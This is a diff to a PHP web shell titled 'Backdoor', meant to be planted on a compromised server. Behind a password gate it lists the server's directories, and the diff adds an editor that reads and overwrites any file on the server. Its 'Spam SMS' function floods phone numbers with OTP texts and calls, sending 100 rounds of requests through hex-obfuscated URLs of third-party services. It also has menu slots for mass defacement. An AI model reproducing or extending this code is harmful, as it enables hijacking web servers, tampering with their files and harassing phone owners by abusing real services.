@@ -22,11 +22,11 @@
  * 
  */
 session_start();
-set_time_limit(0);
-ini_set('error_log',0);
-ini_set('log_errors',0);
-ini_set('display_errors',0);
-ini_set('max_execution_time',0);
+//set_time_limit(0);
+//ini_set('error_log',0);
+//ini_set('log_errors',0);
+//ini_set('display_errors',0);
+//ini_set('max_execution_time',0);
 $auth_pass = "40c880e51dca8d68fddadff873dca125"; // 7c
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 $userAgents = array(
@@ -83,6 +83,11 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
 <!DOCTYPE html>
 <html>
 <title>Backdoor</title>
+
+<!-- CSS STYLE-->
+<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 <style type='text/css'>
 body {
 	background:black;
@@ -113,22 +118,35 @@ body {
 	textarea {
 	background-color:black;
 	color:lime;
+	width: 1066px;
+	height: 500px;
+	border: 3px solid #cccccc;
+	padding: 5px;
+	font-family: Tahoma, sans-serif;
+	background-image: url(bg.gif);
+	background-position: bottom right;
+	background-repeat: no-repeat;
 	}
 	#menu {}
+	input[type=submit]{
+		color:black;
+	}
 	*{font-family: 'Orbitron';}
 	</style>
 <?php
-// Function
-function logout() {
-	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
-	echo "<script>window.location='?';</script>";
+
+// FUNCTION
+function home() {
+	?>
+	<script>window.location='?';</script>
+	<?php
 }
 function spamsms() {
 ?>
 <center>
-<h1>Spam SMS</h1>
+<h2>Spam SMS</h2>
 <form method="post">
-<textarea rows="20" cols="50" name="no" placeholder='No HP ex : 888218005037 ' required></textarea>
+<textarea name="no" placeholder='No HP ex : 888218005037 ' required></textarea>
 <br>
 <input type="submit" name="action"/>
 </form>
@@ -148,12 +166,12 @@ $no=explode("\n",$_POST['no']);
 $no=str_replace(' ','',$no);
 $no=str_replace("\n\n","\n",$no);
 foreach($no as $on):
-echo "Calling     -> ".$on."<br>";
+echo "<hr>Calling     -> ".$on."<hr><br>";
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$on."&accept=call");
 endforeach;
 for($x=0;$x<100;$x++) {
 foreach($no as $on):
-echo "Send OTP To -> ".$on."<br>";
+echo "<hr>Send OTP To -> ".$on."<hr><br>";
 	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$on."&smsType=1");
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$on);
 endforeach;
@@ -163,35 +181,84 @@ endforeach;
 }
 die();
 }
-function massdeface() {
+function jumping() {
+	
 }
 function config() {
+	
 }
-function jumping() {
+function massdeface() {
+	
 }
-// End function
+function logout() {
+	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	home();
+}
+function alert($message) {
+	echo "<script>alert('".$message."')</script>";
+}
+function edit($filename) {
+	if(isset($_POST['text'])) {
+	// save the text contents
+	file_put_contents($filename, $_POST['text']);
+}
+// read the textfile
+$text=file_get_contents($filename);
+?>
+<!-- HTML form -->
+<form action="" method="post">
+	<center>
+		<h2>Files Editor : <?php echo $filename;?></h2>
+<textarea name="text"><?php echo htmlspecialchars($text) ?></textarea><br>
+<input type="submit" />
+</center>
+</form>
+<?php
+die();
+}
+function open() {
+	alert("Kalem euy");
+	home();
+}
+// ENDFUNCTION
 ?>
 <center>
 	<div id='menu'>
-		<li><a href='?'>[ Home ]</a></li>
+		<li><a href='?do=home'>[ Home ]</a></li>
 		<li><a href='?do=sms'>[ Spam SMS ]</a></li>
 		<li><a href='?do=jumping'>[ Jumping ]</a></li>
 		<li><a href='?do=config'>[ Config ]</a></li>
+		<li><a href='?do=massdeface'>[ Mass Deface ]</a></li>
 		<li><a href='?do=logout'>[ Logout ]</a></li>
 	</div>
 </center>
 <?php
-if($_GET['do'] == 'logout') {
-	logout();
-}elseif($_GET['do'] == 'sms') {
+if($_GET['do'] == 'home') {
+	home();
+} elseif($_GET['do'] == 'sms') {
 	spamsms();
+} elseif($_GET['do'] == 'jumping') {
+	jumping();
+} elseif($_GET['do'] == 'config') {
+	config();
+} elseif($_GET['do'] == 'logout') {
+	logout();
+} elseif($_GET['do'] == 'edit' AND isset($_GET['files'])) {
+	edit($_GET['files']);
+} elseif($_GET['do'] == 'open' AND isset($_GET['dir'])) {
+	open($_GET['dir']);
 }
 $dir=scandir(getcwd());
 foreach($dir as $dir):
 ?>
 <table width='70%' class='table_home' cellpadding='3' cellspacing='3' align='center'>
 	<tr>
-		<td><a href='<?php echo $dir;?>'><?php echo $dir;?></a></td>
+		<?php if(is_dir($dir)) {
+		echo "<td><a href='?do=open&dir=$dir'>$dir</a></td>";
+	} else {
+		echo "<td><a href='?do=edit&files=$dir'>$dir</a></td>";
+	}
+	?>
 	</tr>
 </table>
 <?php
